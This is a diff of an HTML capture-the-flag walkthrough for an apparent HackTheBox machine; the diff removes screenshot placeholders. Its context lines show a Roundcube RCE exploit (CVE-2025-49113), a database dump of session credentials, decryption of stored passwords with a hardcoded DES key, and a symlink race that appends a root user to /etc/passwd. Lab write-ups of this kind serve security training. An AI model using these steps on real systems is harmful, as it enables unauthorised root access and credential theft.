@@ -344,18 +344,8 @@
         <li>Domain: <code>mail.outbound.htb</code></li>
     </ul>
     <pre><code>echo "10.129.232.158 mail.outbound.htb outbound.htb" | sudo tee -a /etc/hosts</code></pre>
-    <div class="shot">
-        <img src="outbound_01.png" alt="nmap results showing SSH + Roundcube on port 80"
-             onerror="this.onerror=null;this.style.display='none';this.nextElementSibling.style.display='block'">
-        <div class="img-placeholder" style="display:none">&#128247; Save screenshot here as <code>outbound_01.png</code><br>nmap results showing SSH + Roundcube on port 80</div>
-    </div>
     <h3>Web Enumeration</h3>
     <p>Visiting <code>http://mail.outbound.htb</code> reveals Roundcube Webmail 1.6.10 with a login page at root.</p>
-    <div class="shot">
-        <img src="outbound_02.png" alt="Roundcube login page showing version 1.6.10"
-             onerror="this.onerror=null;this.style.display='none';this.nextElementSibling.style.display='block'">
-        <div class="img-placeholder" style="display:none">&#128247; Save screenshot here as <code>outbound_02.png</code><br>Roundcube login page showing version 1.6.10</div>
-    </div>
     <p>Searching for Roundcube 1.6.10 vulnerabilities turns up <code>CVE-2025-49113</code>: a post-auth RCE via PHP object deserialization.</p>
     <ul>
         <li>Exploit: <code>https://github.com/00xCanelo/CVE-2025-49113</code></li>
@@ -379,11 +369,6 @@ set LPORT 4444
 set AutoCheck false
 exploit</code></pre>
     <p>Result: shell as www-data.</p>
-    <div class="shot">
-        <img src="outbound_03.png" alt="Metasploit RCE giving a www-data shell"
-             onerror="this.onerror=null;this.style.display='none';this.nextElementSibling.style.display='block'">
-        <div class="img-placeholder" style="display:none">&#128247; Save screenshot here as <code>outbound_03.png</code><br>Metasploit RCE giving a www-data shell</div>
-    </div>
     <h4>Alternative: Python Exploit</h4>
     <pre><code>git clone https://github.com/00xCanelo/CVE-2025-49113.git
 cd CVE-2025-49113
@@ -411,11 +396,6 @@ SELECT * FROM users;</code></pre>
     <pre><code>mysql -u roundcube -p'RCDBPass2025' roundcube -e "SELECT * FROM session\G"
 Jacob: L7Rv00A8TuwJAr67kITxxcSgnIk25Am/
 Tyler: TPD0XlxNwd3yRQfb/T+bVY4JQyxrq1B3</code></pre>
-    <div class="shot">
-        <img src="outbound_04.png" alt="Roundcube session table with encrypted passwords"
-             onerror="this.onerror=null;this.style.display='none';this.nextElementSibling.style.display='block'">
-        <div class="img-placeholder" style="display:none">&#128247; Save screenshot here as <code>outbound_04.png</code><br>Roundcube session table with encrypted passwords</div>
-    </div>
     <h3>Decrypting Passwords</h3>
     <p>Using Roundcube's DES key (<code>rcmail-!24ByteDESkey*Str</code>) to decrypt the stored session password:</p>
     <pre><code>php -r '$k="rcmail-!24ByteDESkey*Str";
@@ -448,11 +428,6 @@ drwxr-xr-x 2 root  root 4096 Oct 24 07:10 store</code></pre>
     <div class="warning">
     <p><strong>Critical finding:</strong> <code>error_root.log</code> is world-writable (0666), owned by <code>root:root</code>. This is a misconfiguration that allows symlink attacks.</p>
     </div>
-    <div class="shot">
-        <img src="outbound_05.png" alt="ls -la of /var/log/below showing world-writable error_root.log"
-             onerror="this.onerror=null;this.style.display='none';this.nextElementSibling.style.display='block'">
-        <div class="img-placeholder" style="display:none">&#128247; Save screenshot here as <code>outbound_05.png</code><br>ls -la of /var/log/below showing world-writable error_root.log</div>
-    </div>
     <h3>Understanding the Symlink Attack</h3>
     <p>A root process (Below running via sudo) writes to <code>error_root.log</code>. The file is world-writable, so we can delete it, and the root process recreates it when writing. If we replace it with a symlink during the recreation window, root writes to our symlink target. Pointing it at <code>/etc/passwd</code> lets us append a UID 0 user with no password.</p>
     <h3>The Exploit</h3>
@@ -479,11 +454,6 @@ done</code></pre>
 su pwn
 id
 # uid=0(root) gid=0(root) groups=0(root)</code></pre>
-    <div class="shot">
-        <img src="outbound_06.png" alt="SUCCESS! from the race loop and id showing uid=0(root)"
-             onerror="this.onerror=null;this.style.display='none';this.nextElementSibling.style.display='block'">
-        <div class="img-placeholder" style="display:none">&#128247; Save screenshot here as <code>outbound_06.png</code><br>SUCCESS! from the race loop and id showing uid=0(root)</div>
-    </div>
     <h3>Root Flag</h3>
     <pre><code>cat /root/root.txt</code></pre>
     <h2>Key Lessons &amp; Indicators</h2>
